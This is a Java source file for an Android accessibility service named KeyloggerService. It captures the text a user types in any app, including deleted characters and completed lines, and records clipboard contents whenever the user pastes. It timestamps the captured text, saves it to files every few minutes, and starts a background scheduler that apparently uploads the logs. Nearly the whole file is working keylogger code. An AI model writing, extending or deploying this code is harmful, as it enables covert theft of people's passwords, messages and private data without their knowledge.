



        package com.example.systemslog;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.content.Intent;
import android.os.Handler;
import android.util.Log;
import java.text.SimpleDateFormat;
import java.util.*;

public class KeyloggerService extends AccessibilityService {

    private static final String TAG = "KeyloggerService";
    private StringBuilder logBuffer = new StringBuilder(); // For full logs
    private StringBuilder fullLineBuffer = new StringBuilder(); // For storing full typed lines
    private String lastText = "";

    private Handler handler = new Handler();
    private long sessionStart;
    private final long INTERVAL = 3 * 60 * 1000; // 20 minutes

    private final Runnable saveRunnable = new Runnable() {
        @Override
        public void run() {
            flushLogs();
            handler.postDelayed(this, INTERVAL);
        }
    };

    @Override
    public void onServiceConnected() {
        sessionStart = System.currentTimeMillis();
        handler.postDelayed(saveRunnable, INTERVAL);
        LogUploader.scheduleUploader(this); // Background upload scheduler
        Log.d(TAG, "✅ KeyloggerService connected");
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        switch (event.getEventType()) {
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                if (event.getText() != null && !event.getText().isEmpty()) {
                    String currentText = event.getText().get(0).toString();
                    String delta = getDifference(lastText, currentText);
                    if (!delta.isEmpty()) {
                        logBuffer.append(getTimestamp()).append(" → ").append(delta).append("\n");

                        // Also build fullLineBuffer with readable characters
                        fullLineBuffer.append(delta.replace("[SPACE]", " ").replace("[DEL]", "").replace("[ENTER]", "\n"));
                        lastText = currentText;
                    }
                }
                break;

            case AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED:
                // Clipboard paste
                CharSequence desc = event.getContentDescription();
                if (desc != null && desc.toString().toLowerCase().contains("paste")) {
                    String clipboard = getClipboardText();
                    if (!clipboard.isEmpty()) {
                        logBuffer.append(getTimestamp()).append(" → [PASTE] ").append(clipboard).append("\n");
                        fullLineBuffer.append(clipboard).append(" ");
                    }
                }
                break;

            case AccessibilityEvent.TYPE_VIEW_CLICKED:
                // Simulate enter detection
                if (event.getText() != null && event.getText().toString().contains("\n")) {
                    logBuffer.append(getTimestamp()).append(" → [ENTER]\n");

                    if (fullLineBuffer.length() > 0) {
                        logBuffer.append(getTimestamp()).append(" → [FULL] ").append(fullLineBuffer.toString().trim()).append("\n");
                        fullLineBuffer.setLength(0);
                    }
                }
                break;
        }
    }

    private String getDifference(String oldStr, String newStr) {
        if (newStr.length() > oldStr.length()) {
            String delta = newStr.substring(oldStr.length());
            return delta.replace(" ", "[SPACE]").replace("\n", "[ENTER]");
        } else if (oldStr.length() > newStr.length()) {
            return "[DEL]";
        }
        return "";
    }

    private String getClipboardText() {
        android.content.ClipboardManager clipboard = (android.content.ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
        if (clipboard != null && clipboard.hasPrimaryClip()) {
            CharSequence text = clipboard.getPrimaryClip().getItemAt(0).getText();
            return text != null ? text.toString() : "";
        }
        return "";
    }

    private void flushLogs() {
        long timestamp = System.currentTimeMillis();
        String data = logBuffer.length() == 0 ? "No log found" : logBuffer.toString();

        FileManager.saveLog(this, data, timestamp);

        logBuffer.setLength(0);
        fullLineBuffer.setLength(0);
    }

    private String getTimestamp() {
        return new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date());
    }

    @Override
    public void onInterrupt() {}
}
